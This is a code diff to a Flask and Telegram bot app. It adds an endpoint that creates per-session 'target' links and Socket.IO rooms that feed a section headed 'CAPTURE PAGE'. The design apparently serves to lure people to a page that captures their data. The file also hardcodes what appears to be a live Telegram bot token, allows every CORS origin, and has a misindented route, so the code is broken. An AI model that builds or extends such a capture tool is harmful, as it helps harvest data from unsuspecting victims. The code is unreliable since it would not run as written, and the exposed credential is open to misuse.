@@ -9,6 +9,9 @@ import threading
 from io import BytesIO
 from concurrent.futures import ThreadPoolExecutor
 from flask import Flask, request, jsonify, render_template_string, send_from_directory
+from flask_cors import CORS
+from flask_socketio import SocketIO, join_room, emit
+import uuid
 
 # ==================== CONFIG (HARDCODED) ====================
 BOT_TOKEN = "8904890087:AAEvKIsISE0t1QT5J1lLJcB0htnLhz0lEfs"
@@ -53,6 +56,8 @@ logger = logging.getLogger(__name__)
 app = Flask(__name__)
 app.pending_broadcast = {}
 app.pending_photo = set()
+CORS(app)
+socketio = SocketIO(app, cors_allowed_origins="*")
 
 # ==================== FAST: Background workers ====================
 EXECUTOR = ThreadPoolExecutor(max_workers=8)  # parallel telegram sends
@@ -517,6 +522,25 @@ def webhook():
     except Exception as e:
         logger.error("webhook: %s", e)
         return "OK", 200
+        @app.route('/generate_web_link', methods=['POST'])
+def generate_web_link():
+    data = request.json or {}
+    action_type = data.get('type', 'all')
+    
+    # एक यूनिक आईडी (Session ID) बनाना
+    session_id = str(uuid.uuid4())
+    
+    # टारगेट लिंक बनाना (यहाँ अपनी वेबसाइट/रेंडर का असली बेस URL डालना)
+    target_link = f"https://your-backend-url.onrender.com/target?uid={session_id}&type={action_type}"
+    
+    return jsonify({"link": target_link, "session_id": session_id})
+
+@socketio.on('join')
+def on_join(data):
+    room = data.get('session_id')
+    if room:
+        join_room(room)
+        print(f"User joined room: {room}")
 
 # ==================== CAPTURE PAGE ====================
 
